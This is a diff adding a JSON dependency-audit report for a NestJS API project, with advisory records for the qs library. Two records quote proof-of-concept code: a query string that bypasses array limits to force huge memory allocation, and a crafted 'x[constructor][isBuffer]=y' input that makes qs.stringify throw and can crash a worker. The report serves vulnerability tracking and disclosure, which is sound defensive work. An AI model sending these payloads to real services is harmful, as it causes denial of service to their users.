+      "github_advisory_id": "GHSA-xwg4-73v4-xw9w",
+      "recommendation": "Upgrade to version 5.1.11 or later",
+      "patched_versions": ">=5.1.11",
+      "updated": "2026-09-01T19:23:46.000Z",
+      "cvss": {
+        "score": 7.4,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-190"
+      ],
+      "url": "https://github.com/advisories/GHSA-xwg4-73v4-xw9w"
+    },
+    "1158506": {
+      "findings": [
+        {
+          "version": "6.15.3",
+          "paths": [
+            "apps__api>@nestjs/platform-express>express>qs"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/ljharb/qs/security/advisories/GHSA-w7fw-mjwx-w883\n- https://github.com/ljharb/qs/security/advisories/GHSA-x5fp-wj9c-mxmx\n- https://nvd.nist.gov/vuln/detail/CVE-2026-82562\n- https://github.com/ljharb/qs/commit/8859c37470e11b42b547b275e4e9bd0bc8cc5464\n- https://github.com/advisories/GHSA-x5fp-wj9c-mxmx",
+      "created": "2026-09-02T14:46:57.000Z",
+      "id": 1158506,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`qs` `v6.15.3` allows bracket-key input to bypass `arrayLimit` and `throwOnLimitExceeded` when `comma: true`. The input `a[]=1,2,3,4` succeeds with `arrayLimit: 3`, while the equivalent plain-key input is rejected.\n\nAffected version tested:\n\n```text\nqs v6.15.3\ncommit 18d085e919dae70c8f1b200ab99323058edab2c2\n```\n\n### Details\n\n`parseArrayValue()` enforces the comma limit only for flat values. The `a[]` form is marked non-flat, so its comma-separated value is wrapped after parsing and the inner array is not checked. A single parameter can therefore materialize arbitrarily large arrays.\n\n### PoC\n\n```js\nconst qs = require('qs')\nconst options = { comma: true, arrayLimit: 3, throwOnLimitExceeded: true }\n\nconst result = qs.parse('a[]=1,2,3,4', options)\nconsole.log(result.a[0].length) // 4; expected RangeError\n\nconst big = qs.parse('a[]=' + '1,'.repeat(1000000) + '1', { comma: true, arrayLimit: 20 })\nconsole.log(big.a[0].length) // 1000001\n```\n\nOn `v6.15.3`, the first input parses successfully and the second creates an array with 1,000,001 elements. The equivalent `a=1,2,3,4` input throws `RangeError` as expected.\n\n### Impact\n\nAn attacker who can supply a query string or form body can bypass configured array limits and force excessive memory allocation, causing denial of service. The limit must be applied after comma splitting and before the resulting array is wrapped.",
+      "reported_by": null,
+      "title": "qs array-limit bypass via bracket-key comma parsing",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-82562"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "qs",
+      "vulnerable_versions": ">=6.14.2 <=6.15.3",
+      "github_advisory_id": "GHSA-x5fp-wj9c-mxmx",
+      "recommendation": "Upgrade to version 6.16.0 or later",
+      "patched_versions": ">=6.16.0",
+      "updated": "2026-09-02T14:46:58.000Z",
+      "cvss": {
+        "score": 3.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-x5fp-wj9c-mxmx"
+    },
+    "1158507": {
+      "findings": [
+        {
+          "version": "6.15.3",
+          "paths": [
+            "apps__api>@nestjs/platform-express>express>qs"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/ljharb/qs/security/advisories/GHSA-4mjr-xmp4-gh2g\n- https://nvd.nist.gov/vuln/detail/CVE-2026-82417\n- https://github.com/ljharb/qs/commit/e83d321ffafb38cf210683ac31714fce6ce1c6c6\n- https://github.com/advisories/GHSA-4mjr-xmp4-gh2g",
+      "created": "2026-09-02T14:45:13.000Z",
+      "id": 1158507,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`qs.stringify()` calls `utils.isBuffer()` on every value it serializes, and `utils.isBuffer()` invokes `obj.constructor.isBuffer(obj)` without checking that it is callable. A value whose own `constructor.isBuffer` is a non-function makes `qs` call a non-callable and throw `TypeError`. Such a value is produced **by `qs.parse` itself** from an untrusted query string when `plainObjects: true` or `allowPrototypes: true` is set, so a pure-`qs` `parse` \u2192 `stringify` round-trip \u2014 no `JSON.parse` \u2014 turns an unauthenticated query string into an uncaught throw.\n\nAn attacker-controlled `parse` input reaches the host application's availability asset \u2014 via `qs`'s own recommended `plainObjects` mitigation \u2014 and triggers an uncaught exception during a `parse` \u2192 `stringify` round-trip.\n\n### Details\n`utils.isBuffer` runs at `lib/stringify.js:127` for every serialized value:\n\n```js\nif (isNonNullishPrimitive(obj) || utils.isBuffer(obj)) { ... }\n```\n\n`utils.isBuffer` (`lib/utils.js:327-333`) invokes `obj.constructor.isBuffer` without verifying it is callable:\n\n```js\nvar isBuffer = function isBuffer(obj) {\n    if (!obj || typeof obj !== 'object') { return false; }\n    return !!(obj.constructor && obj.constructor.isBuffer && obj.constructor.isBuffer(obj));\n};\n```\n\n`constructor` and `isBuffer` are ordinary keys. `qs.parse` with `plainObjects: true` or `allowPrototypes: true` keeps them as own properties, so the parsed value carries a non-function `constructor.isBuffer`; `stringify` then calls a non-callable and throws `TypeError`. By contrast `utils.isRegExp` uses a brand check (`Object.prototype.toString`); the missing guard here is an internal inconsistency, not a platform limitation.\n\n\n### Trust Boundary Note\n\n`qs.stringify` alone treats its input as caller-constructed, so serializing a hostile object could be argued outside its contract. This report does not depend on that framing: the malicious shape is produced by **`qs.parse`, whose input is untrusted by design**. `qs.parse` normally strips a `constructor` key via its prototype guard, but with the documented options `plainObjects: true` or `allowPrototypes: true` the key survives and lands as an own property. Feeding the parsed object back into `qs.stringify` \u2014 the standard round-trip in gateways and request-forwarders \u2014 then hits the unchecked call. \n\n\n### PoC\n`poc02c_isBuffer_qs_only_roundtrip.js` \u2014 pure-`qs` chain, no `JSON.parse`; an untrusted query string alone reaches the throw:\n\n```js\n'use strict';\nvar qs = require('qs');\n\nvar untrustedQueryString = 'x%5Bconstructor%5D%5BisBuffer%5D=y'; // x[constructor][isBuffer]=y\n\nvar parsed = qs.parse(untrustedQueryString, { plainObjects: true });\nconsole.log('[parse] kept constructor key:', JSON.stringify(parsed));\n\ntry {\n    qs.stringify(parsed);\n    console.log('[stringify] no throw (unexpected)');\n} catch (e) {\n    console.log('[stringify] DoS reproduced ->', e.constructor.name + ':', e.message);\n}\n```\n\n`poc02_isBuffer.js` \u2014 the minimal defect:\n\n```js\n'use strict';\nvar qs = require('qs');\ntry {\n    qs.stringify(JSON.parse('{\"a\":{\"constructor\":{\"isBuffer\":\"x\"}}}'));\n} catch (e) {\n    console.log('[A] DoS reproduced ->', e.constructor.name + ':', e.message);\n}\n```\n\n`poc02b_isBuffer_async_crash.js` \u2014 worker death in an async sink:\n\n```js\n'use strict';\nvar qs = require('qs');\n\nfunction handleRequestAsync(clientJsonBody) {\n    try {\n        setImmediate(function () {                 // async continuation, outside the try\n            qs.stringify(JSON.parse(clientJsonBody)); // throws here, uncaught\n        });\n        console.log('[handler] returned 200 synchronously; async work scheduled');\n    } catch (e) {\n        console.log('[handler] caught synchronously (will NOT happen):', e.message);\n    }\n}\nprocess.on('exit', function (code) {\n    console.log('[proc] process exiting with code:', code);\n});\nhandleRequestAsync('{\"filters\":{\"constructor\":{\"isBuffer\":\"x\"}}}');\n```\n\n### Execution Steps\n\n```bash\ncd poc\nnpm install qs@6.15.3\nnode poc02c_isBuffer_qs_only_roundtrip.js  # pure qs parse->stringify -> TypeError\nnode poc02_isBuffer.js                      # minimal defect -> TypeError inside stringify\nnode poc02b_isBuffer_async_crash.js         # async sink -> uncaught throw -> exit code 1\n```\n\n### Reproduction Evidence\n\n`poc02c_isBuffer_qs_only_roundtrip.js` :\n\n```\n[parse] kept constructor key: {\"x\":{\"constructor\":{\"isBuffer\":\"y\"}}}\n[stringify] DoS reproduced -> TypeError: obj.constructor.isBuffer is not a function\n```\n\n`poc02_isBuffer.js`:\n\n```\n[A] DoS reproduced -> TypeError: obj.constructor.isBuffer is not a function\n```\n\n`poc02b_isBuffer_async_crash.js` :\n\n```\n[handler] returned 200 synchronously; async work scheduled\n[proc] process exiting with code: 1\nTypeError: obj.constructor.isBuffer is not a function\n    at Object.isBuffer (.../qs/lib/utils.js:332:78)\n    at stringify (.../qs/lib/stringify.js:127:45)\n=== EXIT CODE: 1 ===\n```\n\nThe pure-`qs` round-trip shows the malicious shape originates from `qs.parse` of an untrusted query string, with no `JSON.parse`. The synchronous `try/catch` in the async case does not catch the throw; the process exits with code 1, denying service to all requests on that worker.\n\n### Impact\n\nAn unauthenticated request degrades any endpoint that re-serializes deserialized client data with `qs.stringify`. The primary impact is a per-request failure: the handler throws and the framework returns HTTP 500. Where the call sits in an unguarded async continuation, the throw escapes and the worker process exits, denying service to all requests it was handling, which means a higher impact that depends on the application's error handling, not on `qs`.\n\n### Recommended Fix\n\nReplace the duck-type with a brand check mirroring `utils.isRegExp`:\n\n```js\nvar isBuffer = function isBuffer(obj) {\n    if (!obj || typeof obj !== 'object') { return false; }\n    if (typeof Buffer !== 'undefined' && typeof Buffer.isBuffer === 'function') {\n        return Buffer.isBuffer(obj);\n    }\n    return Object.prototype.toString.call(obj) === '[object Uint8Array]';\n};\n```\n\nIf duck-typing must remain, require `typeof obj.constructor.isBuffer === 'function'` before invoking and wrap the call in `try/catch`.",
+      "reported_by": null,
+      "title": "qs: Denial of Service via Attacker Controlled isBuffer",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-82417"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "qs",
+      "vulnerable_versions": ">=2.2.5 <6.16.0",
+      "github_advisory_id": "GHSA-4mjr-xmp4-gh2g",
+      "recommendation": "Upgrade to version 6.16.0 or later",
+      "patched_versions": ">=6.16.0",
+      "updated": "2026-09-02T14:45:15.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-248",
+        "CWE-703"
+      ],
+      "url": "https://github.com/advisories/GHSA-4mjr-xmp4-gh2g"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 0,
+      "moderate": 7,
+      "high": 5,
+      "critical": 0
+    },
+    "dependencies": 1370,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 1370
+  }
+}
